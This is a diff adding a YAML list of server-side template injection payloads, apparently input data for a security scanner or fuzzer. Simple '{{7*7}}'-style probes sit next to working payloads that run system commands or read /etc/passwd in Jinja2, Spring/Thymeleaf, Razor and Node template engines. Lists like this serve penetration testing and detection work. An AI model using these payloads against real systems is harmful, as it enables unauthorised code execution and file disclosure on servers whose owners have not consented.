@@ -1,0 +1,28 @@
+template_injection:
+- '{{7*7}}'
+- ${7*7}
+- <%= 7*7 %>
+- '#{7*7}'
+- '*{7*7}'
+- '{{config}}'
+- '{{config.items()}}'
+- '{{self}}'
+- '{{self.__class__}}'
+- '{{self.__class__.__mro__}}'
+- '{{self.__class__.__mro__[2].__subclasses__()}}'
+- '{{''''.__class__.__mro__[2].__subclasses__()}}'
+- '{{''''.__class__.__mro__[2].__subclasses__()[40](''/etc/passwd'').read()}}'
+- '{{request.application.__globals__.__builtins__.__import__(''os'').popen(''id'').read()}}'
+- '{{config.__class__.__init__.__globals__[''os''].popen(''id'').read()}}'
+- ${T(java.lang.Runtime).getRuntime().exec('id')}
+- ${T(java.lang.System).getenv()}
+- ${7*7}
+- '#{T(java.lang.Runtime).getRuntime().exec(''id'')}'
+- __${T(java.lang.Runtime).getRuntime().exec('id')}__
+- '*{T(java.lang.Runtime).getRuntime().exec(''id'')}'
+- '@(1+2)'
+- '@(7*7)'
+- '@System.Diagnostics.Process.Start(''cmd'',''/c id'')'
+- '[[${7*7}]]'
+- '[[(${7*7})]]'
+- '{{constructor.constructor(''return this'')().process.mainModule.require(''child_process'').execSync(''id'')}}'
